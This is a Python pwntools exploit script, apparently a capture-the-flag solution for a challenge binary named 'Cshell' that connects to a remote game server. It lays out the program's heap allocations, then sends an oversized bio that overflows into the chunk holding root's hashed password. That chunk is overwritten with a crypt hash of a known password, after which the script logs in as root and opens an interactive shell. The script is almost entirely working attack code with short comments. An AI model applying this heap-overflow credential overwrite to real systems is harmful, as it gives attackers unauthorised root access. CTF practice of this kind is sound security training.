#!/usr/bin/env python3

import crypt

from pwn import *

the_binary = "./Cshell"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("pwn.be.ax", 5001)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}

        # fgets in setup().
        # break *0x401f56

        # strcmp in logout().
        break *0x40208e

        continue
    """)

def send(data):
    io.sendlineafter("> ", data)

def menu(choice):
    send(str(choice))

def logout(username, passwd=None):
    assert len(username) <= 8
    menu(1)

    if len(username) == 8:
        io.sendafter("Username:", username)
    else:
        io.sendlineafter("Username:", username)

    if passwd is not None:
        io.sendlineafter("Password:", passwd)

def whoami():
    menu(2)

def bash():
    menu(3)

def squad():
    menu(4)

# Allocation Flow
# ~~~~~~~~~~~~~~~
# - root_t in main()      -> malloc(0x20)
# - user_t in main()      -> malloc(0x20)
# - alex in history()     -> malloc(0x40)
# - charlie in history()  -> malloc(0x50)
# - johnny in history()   -> malloc(0x60)
# - eric in history()     -> malloc(0x80)
# - charlie in history()  -> free(0x50)
# - eric in history()     -> free(0x80)
# - users in main()       -> malloc(0xac)
# - userbuffer in setup() -> malloc(controlled size)

# Choose username and password; doesn't matter.
send("A"*8)
send("B"*8)

# Send bio length and bio.
bio_len = 0x80-8
send(str(bio_len))

# Overflow into the chunk that store's root's hashed password, overflowing it
# with one under our control.
fake_pw = "b"
fake_pw_crypt = crypt.crypt(fake_pw, salt="1337")
log.info("Using fake password %s with crypt %s" % (fake_pw, fake_pw_crypt))
overflow = b""
overflow += b"C" * (0xc3-8)
overflow += fake_pw_crypt.encode()
assert len(overflow) <= 200
send(overflow)

logout("root", passwd=fake_pw)
bash()

io.interactive()
